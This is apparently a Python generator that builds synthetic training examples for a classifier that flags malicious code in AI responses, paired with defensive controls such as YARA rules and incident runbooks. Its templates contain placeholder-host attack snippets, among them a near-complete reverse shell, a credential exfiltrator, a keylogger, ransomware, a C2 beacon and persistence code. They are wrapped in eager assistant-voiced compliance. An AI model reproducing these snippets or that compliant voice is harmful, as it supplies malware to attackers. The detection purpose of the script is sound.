#!/usr/bin/env python3
"""Generate Track B (egress output-awareness) response-shaped candidates.

Per docs/RESPONSE_CURATION_SPEC.md's resolved decisions (2026-08-11/12):
pilot-scale, synthetic-only, both slices reviewed by the same AI-assisted
dual-review process as Track A. This is the first response-shaped (assistant-
authored, not user-prompt-shaped) generator this pipeline has ever had --
generate_targeted_v02/v03.py both produce only prompt-shaped text.

Positive slice: assistant responses that DELIVER operational malicious-code
output (a code block performing an offensive capability). Every snippet uses
abstracted placeholders ([TARGET_HOST], [PLACEHOLDER_PATH], etc.) for targets,
addresses, and secrets -- never a real, runnable-against-something payload,
matching the same discipline TARGETED_CURATION_SPEC.md mandates prompt-side.

Negative slice: assistant responses that are code-shaped or code-adjacent but
NOT operational -- YARA/Sigma detection rules, malware-analysis descriptions,
code-review comments, incident-response runbooks, secure-coding explanations,
CTF writeup narration. This is precisely the category the code-shape-floor
heuristic's false-positive risk sits on today (pipeline/service/security_api.py
_apply_code_shape_floor) -- these MUST stay code-shaped (so the classifier
learns the real distinction) without being operational.
"""

from __future__ import annotations

import hashlib
import json
import random
from collections import Counter
from pathlib import Path
from typing import Any

PROJECT_ROOT = Path(__file__).resolve().parents[1]
OUTPUT = PROJECT_ROOT / "data" / "raw_v2" / "echelon_response_v0_3" / "candidates.jsonl"
REPORT = PROJECT_ROOT / "data" / "reports" / "response_v03_candidate_report.json"
VERSION = "0.3.0"


def stable_id(text: str, family: str) -> str:
    return "resp03_" + hashlib.sha256(f"{family}\x1f{text}".encode()).hexdigest()[:24]


def make_row(text: str, labels: list[str], family: str, lineage: str, strategy: str, context: str) -> dict[str, Any]:
    return {
        "candidate_id": stable_id(text, family), "text": text.strip(),
        "proposed_labels": labels, "family": family, "parent_id": None,
        "transformation": None, "context": context,
        "generator_id": "echelon_response_shaped_composition",
        "generator_version": VERSION, "language": "en", "review_status": "pending",
        "operational_content": False, "template_lineage": lineage,
        "generation_strategy": strategy, "text_type": "response",
    }


# --- Capability archetypes: (id, capability phrase, abstracted Python snippet) ---
ARCHETYPES = [
    ("credential_harvester", "harvest saved browser credentials", """def harvest_credentials(profile_path=\"[BROWSER_PROFILE_PATH]\"):
    store = open_credential_store(profile_path)
    creds = decrypt_entries(store, key=derive_key(\"[PLACEHOLDER_MASTER_KEY]\"))
    exfiltrate(creds, endpoint=\"[TARGET_EXFIL_HOST]\")
    return len(creds)"""),
    ("keylogger", "log keystrokes to a remote endpoint", """class Keylogger:
    def __init__(self, endpoint=\"[TARGET_EXFIL_HOST]\"):
        self.endpoint = endpoint
        self.buffer = []

    def on_key(self, event):
        self.buffer.append(event.key)
        if len(self.buffer) >= 64:
            send(self.endpoint, \"\".join(self.buffer))
            self.buffer.clear()"""),
    ("ransomware_encryptor", "encrypt a target directory and drop a ransom note", """def encrypt_directory(path=\"[TARGET_DIRECTORY]\", key=b\"[PLACEHOLDER_KEY]\"):
    for file in walk(path):
        data = read(file)
        write(file, aes_encrypt(data, key))
    write(join(path, \"README_RECOVER.txt\"), RANSOM_NOTE_TEMPLATE)"""),
    ("reverse_shell", "open a reverse shell back to an attacker host", """import socket, subprocess

def reverse_shell(host=\"[TARGET_C2_HOST]\", port=4444):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    while True:
        cmd = s.recv(1024).decode()
        out = subprocess.run(cmd, shell=True, capture_output=True)
        s.send(out.stdout + out.stderr)"""),
    ("log_wiper", "clear security event logs to cover tracks", """def wipe_evidence():
    for log_path in [\"[SECURITY_LOG_PATH]\", \"[AUTH_LOG_PATH]\", \"[AUDIT_LOG_PATH]\"]:
        truncate(log_path)
        clear_journal_entries(source=log_path)
    disable_future_logging()"""),
    ("privilege_escalation", "exploit a local privilege-escalation flaw for root", """def escalate_privileges(target_binary=\"[SETUID_BINARY_PATH]\"):
    payload = build_overflow_payload(offset=\"[PLACEHOLDER_OFFSET]\")
    trigger_vulnerable_binary(target_binary, payload)
    return spawn_root_shell()"""),
    ("c2_beacon", "beacon to a command-and-control server and execute tasking", """def beacon_loop(c2=\"[TARGET_C2_HOST]\", interval=60):
    while True:
        task = fetch_task(c2, agent_id=\"[PLACEHOLDER_AGENT_ID]\")
        if task:
            result = execute(task)
            report_result(c2, result)
        sleep(interval)"""),
    ("persistence_implant", "install a scheduled-task backdoor that survives reboot", """def install_persistence(payload_path=\"[PLACEHOLDER_PAYLOAD_PATH]\"):
    create_scheduled_task(
        name=\"SystemHealthCheck\",
        command=payload_path,
        trigger=\"on_logon\",
        hidden=True,
    )"""),
]

INTRO_TEMPLATES_OPERATIONAL = [
    "Sure, here's a Python implementation that will {capability}:\n\n```python\n{code}\n```",
    "Here's the code you asked for -- this will {capability} on the target:\n\n```python\n{code}\n```\nLet me know if you need it adapted for a different environment.",
    "Continuing from where we left off, here's the rest of the implementation to {capability}:\n\n```python\n{code}\n```",
    "```python\n{code}\n```\n\nThis snippet will {capability}. Adjust the placeholder values for your target.",
    "No problem. To {capability}, use this:\n\n```python\n{code}\n```",
    "Here's a working version. It will {capability}:\n\n```python\n{code}\n```\nRun it with elevated privileges for best results.",
]

# --- Matched defensive/explanatory negative controls for each archetype ---
DEFENSIVE_TEMPLATES = [
    (
        "yara_rule",
        """Here's a YARA rule to detect this behavior:

```yara
rule Detect_{Name}
{{
    meta:
        description = "Detects {capability} patterns"
    strings:
        $s1 = "{marker}" ascii
        $s2 = {{ 68 69 64 64 65 6e }}
    condition:
        any of them
}}
```

This flags samples matching the {capability_short} pattern for triage, not for execution.""",
    ),
    (
        "malware_analysis",
        "Analyzing this sample: it appears designed to {capability}. The behavior chain is "
        "consistent with known {family_label} tooling -- I'd recommend isolating the host, "
        "capturing a memory image, and checking outbound connections to unusual endpoints "
        "before remediating. I'm describing the behavior for your incident report, not "
        "providing a working copy.",
    ),
    (
        "code_review",
        "```python\n"
        "# FLAGGED: this function could {capability} if left unpatched.\n"
        "# def {func_name}(...):\n"
        "#     ...\n"
        "```\n\n"
        "I'd reject this in code review -- it has no authorization check and the sink looks exploitable. "
        "Recommend adding an allowlist and audit logging before merge, and removing this code path entirely "
        "if it isn't needed for a legitimate feature.",
    ),
    (
        "incident_runbook",
        "Incident response runbook, step {step}: if you suspect a host was used to {capability}, "
        "isolate it from the network immediately, snapshot the disk for forensics, rotate any "
        "credentials that host had access to, and check the SIEM for lateral movement from its IP "
        "in the prior 24 hours. Do not attempt to interact with the host directly until forensics "
        "has a copy.",
    ),
    (
        "secure_coding_explanation",
        "The vulnerability class that lets an attacker {capability} is usually a missing "
        "authorization boundary combined with an over-privileged execution context. The fix is to "
        "validate the caller's identity before the sensitive operation runs, apply least-privilege "
        "to the process, and add monitoring on the specific API this abuses -- not to write example "
        "exploit code, which I won't provide here.",
    ),
    (
        "ctf_writeup",
        "For the writeup: the challenge wanted us to figure out how an attacker could {capability} "
        "given the binary's flawed input handling. After identifying the vulnerable function during "
        "static analysis, the intended solve path was to report the flag through the platform -- the "
        "point of the exercise was recognizing the flaw, not weaponizing it further.",
    ),
]


# Alternate placeholder-token vocabularies applied as a substitution pass over
# the rendered text -- a genuine lexical-diversity multiplier (different
# concrete-but-abstract token names), not just duplicated text, giving 4x the
# combinatorial volume without hand-authoring more archetypes/templates.
PLACEHOLDER_VARIANTS = [
    {},  # baseline: tokens as written in ARCHETYPES/DEFENSIVE_TEMPLATES above
    {
        "[TARGET_HOST]": "[VICTIM_HOST]", "[TARGET_EXFIL_HOST]": "[EXFIL_ENDPOINT]",
        "[TARGET_C2_HOST]": "[C2_SERVER]", "[TARGET_DIRECTORY]": "[VICTIM_DIRECTORY]",
        "[BROWSER_PROFILE_PATH]": "[USER_PROFILE_PATH]", "[PLACEHOLDER_MASTER_KEY]": "[STORED_MASTER_KEY]",
        "[PLACEHOLDER_KEY]": "[ENCRYPTION_KEY]", "[SECURITY_LOG_PATH]": "[EVENT_LOG_PATH]",
        "[AUTH_LOG_PATH]": "[LOGIN_LOG_PATH]", "[AUDIT_LOG_PATH]": "[SYSTEM_AUDIT_PATH]",
        "[SETUID_BINARY_PATH]": "[PRIVILEGED_BINARY_PATH]", "[PLACEHOLDER_OFFSET]": "[STACK_OFFSET]",
        "[PLACEHOLDER_AGENT_ID]": "[BEACON_ID]", "[PLACEHOLDER_PAYLOAD_PATH]": "[IMPLANT_PATH]",
    },
    {
        "[TARGET_HOST]": "[REMOTE_HOST]", "[TARGET_EXFIL_HOST]": "[COLLECTION_SERVER]",
        "[TARGET_C2_HOST]": "[LISTENER_HOST]", "[TARGET_DIRECTORY]": "[DATA_DIRECTORY]",
        "[BROWSER_PROFILE_PATH]": "[CHROME_PROFILE_DIR]", "[PLACEHOLDER_MASTER_KEY]": "[LOCAL_MASTER_KEY]",
        "[PLACEHOLDER_KEY]": "[CIPHER_KEY]", "[SECURITY_LOG_PATH]": "[WINDOWS_SECURITY_LOG]",
        "[AUTH_LOG_PATH]": "[SSH_AUTH_LOG]", "[AUDIT_LOG_PATH]": "[SYSLOG_AUDIT_PATH]",
        "[SETUID_BINARY_PATH]": "[SUID_BINARY]", "[PLACEHOLDER_OFFSET]": "[BUFFER_OFFSET]",
        "[PLACEHOLDER_AGENT_ID]": "[IMPLANT_ID]", "[PLACEHOLDER_PAYLOAD_PATH]": "[DROPPER_PATH]",
    },
    {
        "[TARGET_HOST]": "[TARGET_ENDPOINT]", "[TARGET_EXFIL_HOST]": "[ATTACKER_SERVER]",
        "[TARGET_C2_HOST]": "[COMMAND_SERVER]", "[TARGET_DIRECTORY]": "[SHARED_FOLDER]",
        "[BROWSER_PROFILE_PATH]": "[BROWSER_DATA_PATH]", "[PLACEHOLDER_MASTER_KEY]": "[VAULT_KEY]",
        "[PLACEHOLDER_KEY]": "[AES_KEY]", "[SECURITY_LOG_PATH]": "[HOST_SECURITY_LOG]",
        "[AUTH_LOG_PATH]": "[ACCESS_LOG_PATH]", "[AUDIT_LOG_PATH]": "[COMPLIANCE_AUDIT_LOG]",
        "[SETUID_BINARY_PATH]": "[ROOT_BINARY_PATH]", "[PLACEHOLDER_OFFSET]": "[RETURN_OFFSET]",
        "[PLACEHOLDER_AGENT_ID]": "[SESSION_TOKEN_ID]", "[PLACEHOLDER_PAYLOAD_PATH]": "[STAGE2_PATH]",
    },
]


def _apply_variant(text: str, variant: dict[str, str]) -> str:
    for old, new in variant.items():
        text = text.replace(old, new)
    return text


def _render_operational(archetype, intro_template) -> str:
    _id, capability, code = archetype
    return intro_template.format(capability=capability, code=code)


def _render_defensive(archetype, defensive_template) -> str:
    _id, capability, _code = archetype
    kind, template = defensive_template
    name = "".join(w.capitalize() for w in _id.split("_"))
    return template.format(
        capability=capability, capability_short=_id.replace("_", " "),
        Name=name, marker=_id.upper(), family_label=_id.replace("_", " "),
        func_name=_id, step=1,
    )


def generate_positive(count: int, seed: int) -> list[dict[str, Any]]:
    product = [
        (a, i, v) for a in range(len(ARCHETYPES))
        for i in range(len(INTRO_TEMPLATES_OPERATIONAL))
        for v in range(len(PLACEHOLDER_VARIANTS))
    ]
    rng = random.Random(seed)
    rng.shuffle(product)
    if count > len(product):
        raise AssertionError(f"response positive: requested {count} > space {len(product)}")
    rows = []
    for a_idx, i_idx, v_idx in product[:count]:
        archetype = ARCHETYPES[a_idx]
        text = _apply_variant(
            _render_operational(archetype, INTRO_TEMPLATES_OPERATIONAL[i_idx]), PLACEHOLDER_VARIANTS[v_idx],
        )
        rows.append(make_row(
            text, ["malicious_code"], "response_malicious_code_v03",
            f"response_malicious_code_v03_{archetype[0]}_{i_idx:02d}_{v_idx}", "operational_response", "malicious",
        ))
    return rows


# DEFENSIVE_TEMPLATES' text is prose/YARA with no [BRACKET_TOKEN]s to swap, so
# PLACEHOLDER_VARIANTS (designed for the operational code snippets) would be a
# no-op multiplier here -- a distinct, lightweight opening-clause variant list
# gives the negative slice genuine additional diversity instead.
REGISTER_VARIANTS = [
    "", "For context: ", "Quick note on this one: ", "Following up on the ticket: ",
]


def generate_negative(count: int, seed: int) -> list[dict[str, Any]]:
    product = [
        (a, d, v) for a in range(len(ARCHETYPES))
        for d in range(len(DEFENSIVE_TEMPLATES))
        for v in range(len(REGISTER_VARIANTS))
    ]
    rng = random.Random(seed)
    rng.shuffle(product)
    if count > len(product):
        raise AssertionError(f"response negative: requested {count} > space {len(product)}")
    rows = []
    for a_idx, d_idx, v_idx in product[:count]:
        archetype = ARCHETYPES[a_idx]
        text = REGISTER_VARIANTS[v_idx] + _render_defensive(archetype, DEFENSIVE_TEMPLATES[d_idx])
        rows.append(make_row(
            text, ["benign"], "response_defensive_control_v03",
            f"response_defensive_control_v03_{archetype[0]}_{DEFENSIVE_TEMPLATES[d_idx][0]}_{v_idx}",
            "defensive_response", "defensive",
        ))
    return rows


POSITIVE_COUNT = 150  # 8 archetypes x 6 intros x 4 placeholder variants = 192 space
NEGATIVE_COUNT = 150  # 8 archetypes x 6 defensive templates x 4 placeholder variants = 192 space


def generate() -> list[dict[str, Any]]:
    positive = generate_positive(POSITIVE_COUNT, seed=501)
    negative = generate_negative(NEGATIVE_COUNT, seed=502)
    rows = positive + negative
    rows.sort(key=lambda row: row["candidate_id"])
    return rows


def sha256_file(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def main() -> int:
    rows = generate()
    ids = [row["candidate_id"] for row in rows]
    if len(ids) != len(set(ids)):
        raise AssertionError("candidate_id collision")
    texts = [row["text"] for row in rows]
    if len(texts) != len(set(texts)):
        raise AssertionError("exact-duplicate text")
    OUTPUT.parent.mkdir(parents=True, exist_ok=True)
    OUTPUT.write_text("".join(json.dumps(row, ensure_ascii=False, sort_keys=True) + "\n" for row in rows), encoding="utf-8")
    report = {
        "report_version": VERSION, "candidates": len(rows),
        "malicious": sum(1 for r in rows if "benign" not in r["proposed_labels"]),
        "benign": sum(1 for r in rows if "benign" in r["proposed_labels"]),
        "family_counts": dict(sorted(Counter(row["family"] for row in rows).items())),
        "pending_review": len(rows), "training_eligible": False,
        "scale_note": "Track B pilot round -- see docs/RESPONSE_CURATION_SPEC.md resolved decision #3",
    }
    REPORT.parent.mkdir(parents=True, exist_ok=True)
    REPORT.write_text(json.dumps(report, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    print(json.dumps(report, indent=2, sort_keys=True))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
